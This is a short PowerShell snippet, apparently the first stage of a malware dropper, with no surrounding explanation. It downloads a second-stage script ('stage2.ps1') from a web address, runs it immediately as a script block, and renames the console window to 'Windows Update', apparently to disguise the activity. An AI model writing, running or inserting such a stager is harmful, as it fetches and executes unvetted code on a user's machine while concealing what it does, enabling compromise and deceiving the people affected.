
$StageScript = (New-Object Net.WebClient).DownloadString("https://localhost:8000/stage2.ps1")
& ([ScriptBlock]::Create($StageScript))
$Host.UI.RawUI.WindowTitle = "Windows Update"
